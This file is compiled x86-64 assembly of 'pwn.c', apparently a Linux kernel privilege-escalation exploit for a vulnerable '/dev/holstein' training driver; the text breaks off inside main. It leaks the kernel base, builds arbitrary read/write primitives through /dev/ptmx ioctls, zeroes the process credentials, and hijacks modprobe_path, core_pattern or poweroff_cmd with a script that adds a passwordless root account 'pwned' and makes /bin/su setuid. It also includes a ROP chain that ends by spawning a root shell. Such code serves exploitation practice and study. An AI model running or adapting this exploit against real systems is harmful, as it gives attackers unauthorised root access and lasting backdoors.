	.file	"pwn.c"
	.text
	.globl	DEBUG_FLAG
	.bss
	.type	DEBUG_FLAG, @object
	.size	DEBUG_FLAG, 1
DEBUG_FLAG:
	.zero	1
	.comm	g_fd,4,4
	.comm	g_ptmx_fd,4,4
	.comm	g_buf_addr,8,8
	.comm	g_buf_addr2,8,8
	.comm	buf,1024,32
	.comm	user_cs,8,8
	.comm	user_rflags,8,8
	.comm	user_sp,8,8
	.comm	user_ss,8,8
	.comm	cookie,8,8
	.comm	kbase,8,8
	.comm	offset,8,8
	.comm	tmp_buf,8,8
	.comm	cred_struct,8,8
	.globl	global_cstate
	.align 4
	.type	global_cstate, @object
	.size	global_cstate, 4
global_cstate:
	.zero	4
	.section	.rodata
.LC0:
	.string	"[!] write failure"
.LC1:
	.string	"[D] Wrote 0x%zx bytes\n"
	.text
	.globl	_write
	.type	_write, @function
_write:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rdx
	movq	-32(%rbp), %rcx
	movl	-20(%rbp), %eax
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	write@PLT
	movq	%rax, -8(%rbp)
	cmpq	$0, -8(%rbp)
	jns	.L2
	leaq	.LC0(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L2:
	movzbl	DEBUG_FLAG(%rip), %eax
	testb	%al, %al
	je	.L4
	movq	stderr(%rip), %rax
	movq	-8(%rbp), %rdx
	leaq	.LC1(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
.L4:
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	_write, .-_write
	.section	.rodata
.LC2:
	.string	"[!] read failure"
.LC3:
	.string	"[D] Read 0x%zx bytes\n"
	.text
	.globl	_read
	.type	_read, @function
_read:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rdx
	movq	-32(%rbp), %rcx
	movl	-20(%rbp), %eax
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	read@PLT
	movq	%rax, -8(%rbp)
	cmpq	$0, -8(%rbp)
	jns	.L6
	leaq	.LC2(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L6:
	movzbl	DEBUG_FLAG(%rip), %eax
	testb	%al, %al
	je	.L8
	movq	stderr(%rip), %rax
	movq	-8(%rbp), %rdx
	leaq	.LC3(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
.L8:
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE7:
	.size	_read, .-_read
	.section	.rodata
.LC4:
	.string	"/dev/holstein"
	.align 8
.LC5:
	.string	"[!] Failed to open device: %s\n"
.LC6:
	.string	"[D] Device opened\n"
	.text
	.globl	open_dev
	.type	open_dev, @function
open_dev:
.LFB8:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movl	$2, %esi
	leaq	.LC4(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movq	-8(%rbp), %rdx
	movl	%eax, (%rdx)
	movq	-8(%rbp), %rax
	movl	(%rax), %eax
	testl	%eax, %eax
	jns	.L10
	leaq	.LC4(%rip), %rsi
	leaq	.LC5(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L10:
	movzbl	DEBUG_FLAG(%rip), %eax
	testb	%al, %al
	je	.L12
	movq	stderr(%rip), %rax
	movq	%rax, %rcx
	movl	$18, %edx
	movl	$1, %esi
	leaq	.LC6(%rip), %rdi
	call	fwrite@PLT
.L12:
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE8:
	.size	open_dev, .-open_dev
	.section	.rodata
	.align 8
.LC7:
	.string	"[!] Failed to get root uid, current uid = %d\n"
	.align 8
.LC8:
	.string	"[*] Spawning shell as root uid"
.LC9:
	.string	"/bin/sh"
	.text
	.globl	spawn_shell
	.type	spawn_shell, @function
spawn_shell:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	call	geteuid@PLT
	movl	%eax, -4(%rbp)
	cmpl	$0, -4(%rbp)
	je	.L14
	movl	-4(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC7(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L14:
	leaq	.LC8(%rip), %rdi
	call	puts@PLT
	leaq	.LC9(%rip), %rdi
	call	system@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	spawn_shell, .-spawn_shell
	.globl	aaw32
	.type	aaw32, @function
aaw32:
.LFB10:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movl	%esi, -12(%rbp)
	movq	kbase(%rip), %rdx
	leaq	1016+buf(%rip), %rax
	addq	$68077, %rdx
	movq	%rdx, (%rax)
	movq	g_buf_addr(%rip), %rdx
	leaq	24+buf(%rip), %rax
	addq	$920, %rdx
	movq	%rdx, (%rax)
	movl	g_fd(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_write
	movl	-12(%rbp), %ecx
	movl	g_ptmx_fd(%rip), %eax
	movq	-8(%rbp), %rdx
	movq	%rcx, %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE10:
	.size	aaw32, .-aaw32
	.globl	aar32
	.type	aar32, @function
aar32:
.LFB11:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movq	kbase(%rip), %rdx
	leaq	1016+buf(%rip), %rax
	addq	$3845625, %rdx
	movq	%rdx, (%rax)
	movq	g_buf_addr(%rip), %rdx
	leaq	24+buf(%rip), %rax
	addq	$920, %rdx
	movq	%rdx, (%rax)
	movl	g_fd(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_write
	movl	g_ptmx_fd(%rip), %eax
	movq	-8(%rbp), %rdx
	movl	$0, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE11:
	.size	aar32, .-aar32
	.section	.rodata
.LC10:
	.string	"[+] Searching... @ 0x%016llx\r"
	.align 8
.LC11:
	.string	"[!] Unable to locate current cred struct"
	.align 8
.LC12:
	.string	"[*] Found current cred struct @ 0x%016llx\n"
	.text
	.globl	overwrite_cred_privesc
	.type	overwrite_cred_privesc, @function
overwrite_cred_privesc:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$-889275714, -20(%rbp)
	movl	$-559038737, -16(%rbp)
	movl	$0, -12(%rbp)
	leaq	-20(%rbp), %rax
	movq	%rax, %rsi
	movl	$15, %edi
	movl	$0, %eax
	call	prctl@PLT
	movq	g_buf_addr(%rip), %rax
	subq	$4194304, %rax
	movq	%rax, -40(%rbp)
	movq	$0, -48(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -48(%rbp)
	jmp	.L19
.L25:
	movq	-48(%rbp), %rax
	andl	$1048575, %eax
	testq	%rax, %rax
	jne	.L20
	movq	-48(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC10(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
.L20:
	movq	-48(%rbp), %rax
	movq	%rax, %rdi
	call	aar32
	movl	-20(%rbp), %edx
	cmpl	%edx, %eax
	jne	.L30
	movq	-48(%rbp), %rax
	addq	$4, %rax
	movq	%rax, %rdi
	call	aar32
	movl	-16(%rbp), %edx
	cmpl	%edx, %eax
	jne	.L31
	subq	$8, -48(%rbp)
	jmp	.L24
.L30:
	nop
	jmp	.L22
.L31:
	nop
.L22:
	addq	$16, -48(%rbp)
.L19:
	movq	-48(%rbp), %rax
	cmpq	-40(%rbp), %rax
	jnb	.L25
.L24:
	cmpq	$0, -48(%rbp)
	jne	.L26
	leaq	.LC11(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L26:
	movq	$0, -32(%rbp)
	movq	-48(%rbp), %rax
	movq	%rax, %rdi
	call	aar32
	movl	%eax, %eax
	orq	%rax, -32(%rbp)
	movq	-48(%rbp), %rax
	addq	$4, %rax
	movq	%rax, %rdi
	call	aar32
	movl	%eax, %eax
	salq	$32, %rax
	orq	%rax, -32(%rbp)
	movq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC12(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, -52(%rbp)
	jmp	.L27
.L28:
	movl	-52(%rbp), %eax
	sall	$2, %eax
	movl	%eax, %edx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	aaw32
	addl	$1, -52(%rbp)
.L27:
	cmpl	$8, -52(%rbp)
	jbe	.L28
	call	spawn_shell
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L29
	call	__stack_chk_fail@PLT
.L29:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	overwrite_cred_privesc, .-overwrite_cred_privesc
	.section	.rodata
	.align 8
.LC13:
	.string	"#!/bin/sh\necho 'pwned::0:0::/:/bin/sh' >> /etc/passwd\nchown root:root /bin/su\nchmod +s /bin/su\n"
.LC14:
	.string	"%s"
.LC15:
	.string	"[!] chmod %s\n"
.LC16:
	.string	"\377\377\377\377"
.LC17:
	.string	"su pwned"
	.text
	.globl	overwrite_modprobe_path_privesc
	.type	overwrite_modprobe_path_privesc, @function
overwrite_modprobe_path_privesc:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movabsq	$7599372675658380335, %rax
	movq	%rax, -21(%rbp)
	movl	$1752378988, -13(%rbp)
	movb	$0, -9(%rbp)
	movq	$0, -40(%rbp)
	jmp	.L33
.L34:
	leaq	-21(%rbp), %rdx
	movq	-40(%rbp), %rax
	addq	%rdx, %rax
	movl	(%rax), %eax
	movq	kbase(%rip), %rcx
	movq	-40(%rbp), %rdx
	addq	%rcx, %rdx
	addq	$14910592, %rdx
	movl	%eax, %esi
	movq	%rdx, %rdi
	call	aaw32
	addq	$4, -40(%rbp)
.L33:
	cmpq	$12, -40(%rbp)
	jbe	.L34
	leaq	-21(%rbp), %rax
	movl	$66, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -44(%rbp)
	movl	-44(%rbp), %eax
	leaq	.LC13(%rip), %rdx
	leaq	.LC14(%rip), %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	dprintf@PLT
	movl	-44(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	leaq	-21(%rbp), %rax
	movl	$511, %esi
	movq	%rax, %rdi
	call	chmod@PLT
	testl	%eax, %eax
	je	.L35
	leaq	-21(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC15(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L35:
	movl	$1886221359, -28(%rbp)
	movw	$30767, -24(%rbp)
	movb	$0, -22(%rbp)
	leaq	-28(%rbp), %rax
	movl	$66, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -44(%rbp)
	movl	-44(%rbp), %eax
	leaq	.LC16(%rip), %rdx
	leaq	.LC14(%rip), %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	dprintf@PLT
	movl	-44(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	leaq	-28(%rbp), %rax
	movl	$511, %esi
	movq	%rax, %rdi
	call	chmod@PLT
	testl	%eax, %eax
	je	.L36
	leaq	-21(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC15(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L36:
	leaq	-28(%rbp), %rax
	movq	%rax, %rdi
	call	system@PLT
	leaq	.LC17(%rip), %rdi
	call	system@PLT
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L38
	call	__stack_chk_fail@PLT
.L38:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	overwrite_modprobe_path_privesc, .-overwrite_modprobe_path_privesc
	.globl	overwrite_core_pattern_privesc
	.type	overwrite_core_pattern_privesc, @function
overwrite_core_pattern_privesc:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	kbase(%rip), %rax
	addq	$15405792, %rax
	movl	$124, %esi
	movq	%rax, %rdi
	call	aaw32
	movabsq	$7599372675658380335, %rax
	movq	%rax, -21(%rbp)
	movl	$1752378988, -13(%rbp)
	movb	$0, -9(%rbp)
	movq	$0, -32(%rbp)
	jmp	.L40
.L41:
	leaq	-21(%rbp), %rdx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movl	(%rax), %eax
	movq	kbase(%rip), %rcx
	movq	-32(%rbp), %rdx
	addq	%rcx, %rdx
	addq	$15405793, %rdx
	movl	%eax, %esi
	movq	%rdx, %rdi
	call	aaw32
	addq	$4, -32(%rbp)
.L40:
	cmpq	$12, -32(%rbp)
	jbe	.L41
	leaq	-21(%rbp), %rax
	movl	$66, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -36(%rbp)
	movl	-36(%rbp), %eax
	leaq	.LC13(%rip), %rdx
	leaq	.LC14(%rip), %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	dprintf@PLT
	movl	-36(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	leaq	-21(%rbp), %rax
	movl	$511, %esi
	movq	%rax, %rdi
	call	chmod@PLT
	testl	%eax, %eax
	je	.L42
	leaq	-21(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC15(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L42:
	call	abort@PLT
	.cfi_endproc
.LFE14:
	.size	overwrite_core_pattern_privesc, .-overwrite_core_pattern_privesc
	.globl	overwrite_poweroff_cmd_privesc
	.type	overwrite_poweroff_cmd_privesc, @function
overwrite_poweroff_cmd_privesc:
.LFB15:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movabsq	$7599372675658380335, %rax
	movq	%rax, -21(%rbp)
	movl	$1752378988, -13(%rbp)
	movb	$0, -9(%rbp)
	movq	$0, -32(%rbp)
	jmp	.L45
.L46:
	leaq	-21(%rbp), %rdx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movl	(%rax), %eax
	movq	kbase(%rip), %rcx
	movq	-32(%rbp), %rdx
	addq	%rcx, %rdx
	addq	$14908608, %rdx
	movl	%eax, %esi
	movq	%rdx, %rdi
	call	aaw32
	addq	$4, -32(%rbp)
.L45:
	cmpq	$12, -32(%rbp)
	jbe	.L46
	leaq	-21(%rbp), %rax
	movl	$66, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -36(%rbp)
	movl	-36(%rbp), %eax
	leaq	.LC13(%rip), %rdx
	leaq	.LC14(%rip), %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	dprintf@PLT
	movl	-36(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	leaq	-21(%rbp), %rax
	movl	$511, %esi
	movq	%rax, %rdi
	call	chmod@PLT
	testl	%eax, %eax
	je	.L47
	leaq	-21(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC15(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L47:
	movq	kbase(%rip), %rdx
	leaq	1016+buf(%rip), %rax
	addq	$471616, %rdx
	movq	%rdx, (%rax)
	movq	g_buf_addr(%rip), %rdx
	leaq	24+buf(%rip), %rax
	addq	$920, %rdx
	movq	%rdx, (%rax)
	movl	g_fd(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_write
	movl	g_ptmx_fd(%rip), %eax
	movl	$0, %edx
	movl	$0, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L49
	call	__stack_chk_fail@PLT
.L49:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE15:
	.size	overwrite_poweroff_cmd_privesc, .-overwrite_poweroff_cmd_privesc
	.globl	ropchain
	.type	ropchain, @function
ropchain:
.LFB16:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	leaq	buf(%rip), %rax
	movq	%rax, -8(%rbp)
	movq	$0, -16(%rbp)
	movq	kbase(%rip), %rcx
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	leaq	1312650(%rcx), %rdx
	movq	%rdx, (%rax)
	movl	global_cstate(%rip), %eax
	testl	%eax, %eax
	jne	.L51
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	kbase(%rip), %rcx
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	leaq	468320(%rcx), %rdx
	movq	%rdx, (%rax)
	jmp	.L52
.L51:
	movl	global_cstate(%rip), %eax
	cmpl	$1, %eax
	jne	.L52
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rax, %rdx
	movq	cred_struct(%rip), %rax
	movq	%rax, (%rdx)
	movq	kbase(%rip), %rcx
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	leaq	467904(%rcx), %rdx
	movq	%rdx, (%rax)
.L52:
	movq	kbase(%rip), %rcx
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	leaq	8392230(%rcx), %rdx
	movq	%rdx, (%rax)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movq	$0, (%rax)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	leaq	safe_exit(%rip), %rdx
	movq	%rdx, (%rax)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rax, %rdx
	movq	user_cs(%rip), %rax
	movq	%rax, (%rdx)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rax, %rdx
	movq	user_rflags(%rip), %rax
	movq	%rax, (%rdx)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rax, %rdx
	movq	user_sp(%rip), %rax
	movq	%rax, (%rdx)
	movq	-16(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -16(%rbp)
	leaq	0(,%rax,8), %rdx
	movq	-8(%rbp), %rax
	addq	%rax, %rdx
	movq	user_ss(%rip), %rax
	movq	%rax, (%rdx)
	movq	kbase(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	$96, %rax
	addq	$1375210, %rdx
	movq	%rdx, (%rax)
	movl	-20(%rbp), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_write
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE16:
	.size	ropchain, .-ropchain
	.section	.rodata
.LC18:
	.string	"/dev/ptmx"
.LC19:
	.string	"[!] open /dev/ptmx"
.LC20:
	.string	"[*] g_buf_addr2 = 0x%016llx\n"
	.text
	.globl	rop_privesc
	.type	rop_privesc, @function
rop_privesc:
.LFB17:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	-20(%rbp), %eax
	movl	%eax, %edi
	call	ropchain
	leaq	g_fd(%rip), %rdi
	call	open_dev
	leaq	-16(%rbp), %rax
	movq	%rax, %rdi
	call	open_dev
	movl	-16(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	$256, %esi
	leaq	.LC18(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -12(%rbp)
	cmpl	$0, -12(%rbp)
	jns	.L54
	leaq	.LC19(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L54:
	movl	g_fd(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_read
	movl	global_cstate(%rip), %eax
	testl	%eax, %eax
	jne	.L55
	leaq	56+buf(%rip), %rax
	movq	(%rax), %rax
	subq	$56, %rax
	movq	%rax, g_buf_addr2(%rip)
	movq	g_buf_addr2(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC20(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
.L55:
	leaq	24+buf(%rip), %rdx
	movq	-32(%rbp), %rax
	movq	%rax, (%rdx)
	movl	g_fd(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_write
	movq	-32(%rbp), %rax
	leaq	-8(%rax), %rdx
	movl	-12(%rbp), %eax
	movl	$3735928559, %esi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L56
	call	__stack_chk_fail@PLT
.L56:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE17:
	.size	rop_privesc, .-rop_privesc
	.section	.rodata
.LC21:
	.string	"[D] cred_struct @ 0x%llx\n"
	.text
	.globl	safe_exit
	.type	safe_exit, @function
safe_exit:
.LFB18:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 266 "pwn.c" 1
	.intel_syntax noprefix;mov tmp_buf, rax;.att_syntax noprefix;
# 0 "" 2
#NO_APP
	movl	global_cstate(%rip), %eax
	testl	%eax, %eax
	jne	.L58
	movq	tmp_buf(%rip), %rax
	movq	%rax, cred_struct(%rip)
	movzbl	DEBUG_FLAG(%rip), %eax
	testb	%al, %al
	je	.L59
	movq	cred_struct(%rip), %rdx
	movq	stderr(%rip), %rax
	leaq	.LC21(%rip), %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	fprintf@PLT
.L59:
	movl	$1, global_cstate(%rip)
	movq	g_buf_addr2(%rip), %rdx
	movl	g_fd(%rip), %eax
	movq	%rdx, %rsi
	movl	%eax, %edi
	call	rop_privesc
	jmp	.L57
.L58:
	call	spawn_shell
.L57:
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE18:
	.size	safe_exit, .-safe_exit
	.section	.rodata
.LC22:
	.string	"[D] User state saved\n"
	.text
	.globl	save_user_state
	.type	save_user_state, @function
save_user_state:
.LFB19:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
#APP
# 280 "pwn.c" 1
	.intel_syntax noprefix;mov user_cs, cs;mov user_sp, rsp;mov user_ss, ss;pushf;pop user_rflags;.att_syntax;
# 0 "" 2
#NO_APP
	movzbl	DEBUG_FLAG(%rip), %eax
	testb	%al, %al
	je	.L63
	movq	stderr(%rip), %rax
	movq	%rax, %rcx
	movl	$21, %edx
	movl	$1, %esi
	leaq	.LC22(%rip), %rdi
	call	fwrite@PLT
.L63:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE19:
	.size	save_user_state, .-save_user_state
	.section	.rodata
.LC23:
	.string	"DEBUG"
.LC24:
	.string	"[*] kbase = 0x%016llx\n"
.LC25:
	.string	"[*] g_buf_addr = 0x%016llx\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB20:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movl	%edi, -36(%rbp)
	movq	%rsi, -48(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	$0, -16(%rbp)
	jmp	.L65
.L68:
	movq	-16(%rbp), %rax
	leaq	0(,%rax,8), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movq	(%rax), %rax
	leaq	.LC23(%rip), %rsi
	movq	%rax, %rdi
	call	strcmp@PLT
	testl	%eax, %eax
	jne	.L66
	movb	$1, DEBUG_FLAG(%rip)
	jmp	.L67
.L66:
	addq	$1, -16(%rbp)
.L65:
	movl	-36(%rbp), %eax
	cltq
	cmpq	%rax, -16(%rbp)
	jb	.L68
.L67:
	movq	stdout(%rip), %rax
	movl	$0, %esi
	movq	%rax, %rdi
	call	setbuf@PLT
	call	save_user_state
	leaq	g_fd(%rip), %rdi
	call	open_dev
	leaq	-20(%rbp), %rax
	movq	%rax, %rdi
	call	open_dev
	movl	-20(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	$256, %esi
	leaq	.LC18(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, g_ptmx_fd(%rip)
	movl	g_ptmx_fd(%rip), %eax
	testl	%eax, %eax
	jns	.L69
	leaq	.LC19(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L69:
	movl	g_fd(%rip), %eax
	movl	$1024, %edx
	leaq	buf(%rip), %rsi
	movl	%eax, %edi
	call	_read
	leaq	24+buf(%rip), %rax
	movq	(%rax), %rax
	subq	$12819552, %rax
	movq	%rax, kbase(%rip)
	leaq	56+buf(%rip), %rax
	movq	(%rax), %rax
	subq	$56, %rax
	movq	%rax, g_buf_addr(%rip)
	movq	kbase(%rip), %rax
	movq	%rax, %rsi
